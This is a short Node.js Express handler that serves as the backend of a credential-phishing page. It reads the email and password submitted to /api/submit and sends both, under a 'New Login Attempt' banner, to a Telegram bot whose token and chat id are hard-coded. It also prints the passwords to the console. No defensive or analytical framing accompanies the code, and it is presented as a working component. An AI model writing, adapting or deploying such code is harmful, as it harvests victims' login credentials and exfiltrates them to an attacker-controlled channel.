// api/submit.js
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot Info
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
const chatId = '7587120060';

// Log incoming requests
app.post('/api/submit', async (req, res) => {
  try {
    console.log("✅ Request received");

    const { email, password } = req.body;

    if (!email || !password) {
      console.log("❌ Missing email or password");
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    console.log(`📨 Sending to Telegram: ${email} | ${password}`);

    const message = `🚨 New Login Attempt 🚨\n\nEmail: ${email}\nPassword: ${password}`;

    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot ${telegramBotToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message
      }
    );

    console.log("✅ Message sent to Telegram:", telegramResponse.data);

    res.status(200).json({ success: true });
  } catch (error) {
    console.error("❌ Submission failed:", error.message);
    if (error.response?.data) {
      console.error("Telegram API Response:", error.response.data);
    }
    res.status(500).json({ error: "Failed to send credentials." });
  }
});

app.options('/api/submit', cors());

module.exports = app;
